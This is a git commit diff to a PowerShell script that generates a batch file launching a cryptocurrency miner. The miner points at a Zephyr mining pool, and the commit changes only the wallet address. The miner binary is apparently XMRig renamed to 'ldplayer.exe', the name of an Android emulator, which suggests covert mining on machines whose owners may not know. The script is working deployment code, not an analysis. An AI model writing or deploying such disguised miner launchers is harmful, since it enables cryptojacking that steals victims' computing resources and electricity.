51f3b3cbaadf78d85a183deedfd2b30b4f69eaa8
trangtrau <30510221+trangtrau@users.noreply.github.com>
2024-01-16 14:06:56 +0700

    Update qrl.ps1

--- qrl.ps1
+++ qrl.ps1
@@ -13,7 +13,7 @@ $userName = $userName -replace "^.*\\", ""
 $folderPath = "C:\CSANGXMRIG\"
 $batContent = @"
 cd %~dp0
-ldplayer.exe -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p $userName -a rx/0 -k -t 8
+ldplayer.exe -o zephyr.miningocean.org:5332 -u ZEPHsAtsau1NnQ96FKLV5RNQFqzgi5NPbUqCUGHb5MCnUjT3H2vF9usMdE5YUG5fTu1Mfyqz7pNYxFgaZgSKVA9YSWPFmWkpjUX -p $userName -a rx/0 -k -t 8
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
